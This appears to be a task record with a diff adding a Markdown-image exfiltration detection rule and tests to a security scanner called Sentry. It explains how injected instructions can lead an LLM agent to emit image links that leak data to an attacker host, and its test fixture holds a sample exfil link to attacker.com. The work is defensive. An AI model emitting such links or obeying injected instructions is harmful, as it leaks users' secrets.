task_description: Sentry's six default rules include env_exfil_pattern and network_exfil_pattern for exfiltration via Python code (os.environ access, requests.post to a suspicious host), but none of the six rules match a well-documented alternate exfiltration channel: exfiltration via auto-rendered Markdown image syntax. Many LLM-agent front-ends and chat UIs auto-fetch image URLs found in Markdown output (e.g. ![...](https://...)), so an attacker-controlled or injected instruction can smuggle sensitive data out by asking the agent to emit a Markdown image (or plain link) whose URL embeds the data as a query parameter pointing at an attacker-controlled host - the mere act of rendering the message triggers an outbound HTTP request, with no code execution or explicit exfil pattern like os.environ/requests.post involved at all. This is a real, previously disclosed technique against LLM agents/chat UIs, and is structurally invisible to Sentry's current ruleset because none of its six rules examine Markdown link/image syntax at all. Add one new detection rule to Sentry that closes this specific gap, plus its test cases, following Sentry's existing conventions exactly.
diff:
--- a/rules/default_rules.json
+++ b/rules/default_rules.json
@@ -34,5 +34,11 @@
     "pattern": "(?i)(urllib\\.request\\.urlopen.*json|requests\\.(post|put).*(env|environ)|httpbin\\.org|json\\.dumps.*env.*urlopen)",
     "severity": "HIGH",
     "description": "Network request containing serialized environment data"
+  },
+  {
+    "name": "markdown_exfil_pattern",
+    "pattern": "(?i)(!?\\[[^\\]]*\\]\\(https?://[^)]+?\\?[^)]+?\\))",
+    "severity": "HIGH",
+    "description": "Markdown image or link syntax containing query parameters — potential exfil vector"
   }
 ]
--- a/tests/test_rules_detection.py
+++ b/tests/test_rules_detection.py
@@ -32,6 +32,10 @@
         "positive": "requests.post('https://collector.example.com', data=os.environ)",
         "negative": "requests.get('https://example.com/status')",
     },
+    "markdown_exfil_pattern": {
+        "positive": "![leak](https://attacker.com/exfil.png?data=sensitive_info)",
+        "negative": "![logo](https://example.com/assets/logo.png)",
+    },
 }
rationale: LLM-agent front-ends and chat UIs often auto-render Markdown images and follow links. This allows attackers to perform data exfiltration by injecting instructions that coerce the LLM to output a Markdown image or link pointing to an attacker-controlled server with sensitive data encoded as query parameters. This new rule detects Markdown link or image syntax referencing external HTTP/HTTPS URLs with query parameters, closing this critical and well-documented exfiltration vector.

claims.statement: Markdown image exfiltration (using image/link tags with query parameters to auto-trigger requests on render) is a documented prompt-injection/exfiltration technique against LLM agents/chat UIs.
claims.source: "Indirect Prompt Injection on LLMs", Greshake et al. 2023

claims.statement: Sentry's current default ruleset does not match Markdown syntax for exfiltration.
